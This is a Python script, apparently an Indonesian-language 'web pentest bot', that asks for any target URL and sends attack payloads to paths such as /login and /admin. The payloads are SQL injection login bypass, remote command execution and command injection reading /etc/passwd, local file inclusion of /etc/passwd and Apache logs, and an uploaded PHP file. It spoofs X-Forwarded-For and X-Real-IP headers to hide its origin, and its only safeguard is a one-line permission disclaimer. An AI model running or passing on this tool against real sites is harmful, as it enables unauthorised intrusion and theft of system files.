import requests
from bs4 import BeautifulSoup
import time
import random
import threading
import base64
from urllib.parse import quote_plus

R = '\033[91m'  # Red
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
B = '\033[94m'  # Blue
M = '\033[95m'  # Magenta
C = '\033[96m'  # Cyan
N = '\033[0m'   # Reset

def banner():
    print(f"""{G}
-------------------------{R}######{G}-------------------------
---------------------{R}######{G}--{R}######{G}---------------------
------------------{R}###{G}--------------{R}###{G}------------------
---------------{R}####{G}------------------{R}####{G}---------------
--------------{R}#{G}-{R}#{G}--------------------{R}#{G}-{R}#{G}-{R}#{G}--------------
--------------{R}##{G}------------------------{R}##{G}--------------
-------------{R}#{G}----------------------------{R}#{G}-------------
------------{R}#{G}-------------{R}####{G}-------------{R}#{G}------------
-------------------------{R}######{G}-------------------------
-----------{R}#{G}--------{R}##{G}----{R}####{G}----{R}##{G}--------{R}#{G}-----------
----------{R}#{G}-------{R}######{G}---{R}##{G}---{R}######{G}-------{R}#{G}----------
---------{R}#{G}-----------------{R}##{G}----------------{R}##{G}---------
--------{R}#{G}--------{R}######################{G}-------{R}##{G}--------
-----------------{R}######################{G}-----------------
-------{R}#{G}--------------{R}##{G}---{R}##{G}---{R}##{G}--------------{R}#{G}-------
------------------{R}#{G}---{R}###{G}------{R}###{G}---{R}#{G}------------------
--------{R}#{G}----------{R}#{G}-------{R}##{G}-------{R}#{G}----------{R}#{G}--------
---------{R}#{G}----------{R}##{G}-{R}####{G}--{R}#######{G}----------{R}#{G}---------
------------{R}#{G}---------{R}#####{G}--{R}#####{G}---------{R}#{G}------------
----------{R}#{G}-------------{R}###{G}--{R}###{G}-------------{R}#{G}----------
-----------{R}##{G}------------------------------{R}##{G}-----------
-------{R}#####{G}--------------------------------{R}#####{G}-------
----{R}###{G}-{R}#{G}--------------------------------------{R}#{G}-{R}###{G}----
--------------------------------------------------------
--------------------------------------------------------
----------------------{R}#{G}----------{R}#{G}----------------------
----------------------{R}#{G}----------{R}#{G}----------------------
---------------------------------{R}#{G}----------------------
    """)
    print("Printing banner...")
    print(f"{R}                                                                                   {N}")
    print(f"{R} ,-----.         ,--.                 ,--.                                         {N}")
    print(f"{Y}'  .--./,--. ,--.|  |-.  ,---. ,--.--.|  ,---.  ,---. ,--.--. ,---.  ,---.  ,---.  {N}")
    print(f"{G}|  |     \\  '  /| .-. '| .-. :|  .--'|  .-.  || .-. :|  .--' | .-. || .-. (  .-'  {N}")
    print(f"{C}'  '--'\\  \\   '| `-'  \\  --.|  |   |  | |  |\\  --.|  |    ' '-' \\ `---..-'  `) {N}")
    print(f"{M} `-----'.-'  /    `---'  `----'`--'   `--' `--' `----'`--'    `---'  `----'`----'  {N}")
    print(f"{Y}        `---'                                                                       {N}")
    print("Banner printed.")  

class Colors:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"

class WebPenTestBot:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
            'X-Real-IP': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255))
        })
        print(f"{Colors.MAGENTA}Disclaimer: Pastikan Anda memiliki izin eksplisit untuk melakukan pengujian ini.{Colors.RESET}")
        self.log_file = 'pentest_results.log'

    def log(self, message, color=Colors.RESET):
        with open(self.log_file, 'a') as log:
            log.write(message + '\n')
        print(f"{color}{message}{Colors.RESET}")

    def get_html(self, path, retries=3):
        url = self.base_url + path
        attempt = 0
        while attempt < retries:
            try:
                response = self.session.get(url, timeout=3)
                response.raise_for_status()
                return response.text
            except requests.exceptions.RequestException as e:
                attempt += 1
                self.log(f"{Colors.RED}[x] Gagal mengakses {url}, percobaan {attempt} dari {retries}: {str(e)}{Colors.RESET}")
                time.sleep(random.randint(1, 2))  
        return None

    def obfuscate_payload(self, payload):
        encoded_payload = base64.b64encode(payload.encode()).decode()
        return encoded_payload

    def test_sql_injection(self, path):
        payload = "admin' OR '1'='1' -- "
        encoded_payload = self.obfuscate_payload(payload)
        url = self.base_url + path
        data = {"username": encoded_payload, "password": encoded_payload}
        response = self.session.post(url, data=data)

        if 'error' in response.text.lower():
            self.log(f"{Colors.YELLOW}[!] Eksploitasi SQL Injection berhasil menyebabkan error pada: {url}{Colors.RESET}")
        elif 'Welcome' in response.text:
            self.log(f"{Colors.GREEN}[!] Eksploitasi SQL Injection berhasil, akses ke akun admin terbuka: {url}{Colors.RESET}")
        else:
            self.log(f"{Colors.RED}[x] Tidak ada SQL Injection di {url}{Colors.RESET}")

        return response.text

    def test_remote_code_execution(self, path):
        payload = {'cmd': 'cat /etc/passwd'}  # Mengambil data sistem penting
        url = self.base_url + path
        response = self.session.post(url, data=payload)

        if 'error' in response.text.lower():
            self.log(f"{Colors.YELLOW}[!] Eksploitasi RCE berhasil, server mungkin down atau error di {url}{Colors.RESET}")
        elif 'Hacked by CyberHeroes' in response.text:
            self.log(f"{Colors.GREEN}[!] Eksploitasi RCE berhasil, server dieksploitasi dengan perintah merusak: {url}{Colors.RESET}")
        else:
            self.log(f"{Colors.RED}[x] Tidak ada RCE di {url}{Colors.RESET}")

        return response.text

    def test_command_injection(self, path):
        payload = {'input': '$(cat /etc/passwd)'}  # Mengambil data sistem penting
        url = self.base_url + path
        response = self.session.get(url, params=payload)

        if 'error' in response.text.lower():
            self.log(f"{Colors.YELLOW}[!] Eksploitasi Command Injection berhasil menyebabkan error di: {url}{Colors.RESET}")
        elif 'root' in response.text:
            self.log(f"{Colors.GREEN}[!] Eksploitasi Command Injection berhasil, data penting diambil: {url}{Colors.RESET}")
        else:
            self.log(f"{Colors.RED}[x] Tidak ada Command Injection di {url}{Colors.RESET}")

        return response.text

    def test_local_file_inclusion(self, path):
        payload = {'file': '../../etc/passwd'}  # Mengakses file penting pada server
        url = self.base_url + path
        response = self.session.get(url, params=payload)

        if 'root:' in response.text:
            self.log(f"{Colors.GREEN}[!] Eksploitasi LFI berhasil, file /etc/passwd berhasil diakses di {url}{Colors.RESET}")
            payload = {'file': '../../var/log/apache2/error.log'}  # Mengakses file log server
            response = self.session.get(url, params=payload)
            if response.status_code == 200:
                self.log(f"{Colors.GREEN}[!] Akses file log server yang berbahaya: {response.text[:500]}{Colors.RESET}")
        else:
            self.log(f"{Colors.RED}[x] Tidak ada LFI di {url}{Colors.RESET}")

        return response.text

    def test_file_upload(self, path):
        url = self.base_url + path
        files = {'file': ('malicious.php', '<php>echo "Hacked!";</php>', 'application/x-php')}
        response = self.session.post(url, files=files)

        if response.status_code == 200 and 'Hacked!' in response.text:
            self.log(f"{Colors.GREEN}[!] Eksploitasi File Upload Vulnerability berhasil pada: {url}{Colors.RESET}")
            exploit_url = self.base_url + '/uploads/malicious.php'
            exploit_response = self.session.get(exploit_url)
            if 'Hacked!' in exploit_response.text:
                self.log(f"{Colors.GREEN}[!] File PHP berhasil diunggah dan dieksekusi.{Colors.RESET}")
        else:
            self.log(f"{Colors.RED}[x] Tidak ada kerentanan file upload di {url}{Colors.RESET}")

        return response.text

    def start_exploit_threads(self, paths):
        threads = []
        results = []
        for path in paths:
            thread = threading.Thread(target=self.test_sql_injection, args=(path,))
            threads.append(thread)
            thread.start()

            thread = threading.Thread(target=self.test_remote_code_execution, args=(path,))
            threads.append(thread)
            thread.start()

            thread = threading.Thread(target=self.test_command_injection, args=(path,))
            threads.append(thread)
            thread.start()

            thread = threading.Thread(target=self.test_local_file_inclusion, args=(path,))
            threads.append(thread)
            thread.start()

            thread = threading.Thread(target=self.test_file_upload, args=(path,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        return results

    def analyze_site(self):
        paths = ['/login', '/admin', '/upload', '/search', '/user', '/config', '/files', '/data']
        results = self.start_exploit_threads(paths)
        return results

if __name__ == "__main__":
    target_url = input(f"{Colors.BLUE}Masukkan URL target (misal: http://example.com): {Colors.RESET}").strip()
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        print(f"{Colors.RED}URL tidak valid. Pastikan URL dimulai dengan http:// atau https://{Colors.RESET}")
    else:
        bot = WebPenTestBot(target_url)
        bot.analyze_site()
